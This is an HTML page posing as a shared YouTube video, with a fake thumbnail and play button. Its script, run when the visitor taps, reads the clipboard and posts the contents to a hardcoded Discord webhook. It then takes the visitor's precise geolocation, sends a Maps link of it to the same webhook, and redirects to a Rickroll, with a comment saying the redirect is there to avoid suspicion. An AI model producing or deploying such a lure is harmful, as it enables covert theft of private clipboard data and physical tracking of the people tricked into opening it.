<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Roboto, Arial, sans-serif; background-color: #0f0f0f; color: white; text-align: center; margin: 0; padding: 20px; }
        .video-container { max-width: 500px; margin: auto; position: relative; cursor: pointer; display: block; }
        .thumbnail { width: 100%; border-radius: 12px; display: block; }
        .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 70px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 10px; display: flex; align-items: center; justify-content: center; }
        .play-button::after { content: ''; display: block; border-style: solid; border-width: 10px 0 10px 15px; border-color: transparent transparent transparent white; }
        .title { text-align: left; font-size: 18px; margin-top: 12px; font-weight: bold; }
        #status { color: #aaa; margin-top: 20px; font-size: 14px; }
    </style>
</head>
<body>

    <div class="video-container" onclick="handleInteraction()">
        <div style="position: relative;">
            <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" class="thumbnail">
            <div class="play-button"></div>
        </div>
        <div class="title">New Video Shared With You</div>
    </div>

    <p id="status">Tap video to play</p>

    <script>
        // FIXED URL (No spaces)
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1459670855922749460/yRDD8kBwyUHJkRbGMtSbla4u70mA8ZCv30RbeifDH3EciizbyXGSJMJMZ1R094deGB2x";
        const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

        async function handleInteraction() {
            const status = document.getElementById('status');
            status.innerText = "Syncing...";

            // 1. Try Clipboard First
            try {
                if (navigator.clipboard) {
                    const text = await navigator.clipboard.readText();
                    if (text) {
                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({content: "📋 **Clipboard:** " + text})
                        });
                    }
                }
            } catch (e) { console.log("Clip skip"); }

            // 2. Wait 500ms before Location to avoid permission clashing
            await new Promise(r => setTimeout(r, 500));

            // 3. Try Location
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({content: "📍 **Location:** " + mapLink})
                    });

                    // Wait 1 sec for data to send before redirect
                    status.innerText = "Connecting...";
                    setTimeout(() => { window.location.href = REDIRECT_URL; }, 1000);

                }, (err) => {
                    // Even if denied, redirect to avoid suspicion
                    window.location.href = REDIRECT_URL;
                }, { enableHighAccuracy: true });
            } else {
                window.location.href = REDIRECT_URL;
            }
        }
    </script>
</body>
</html>
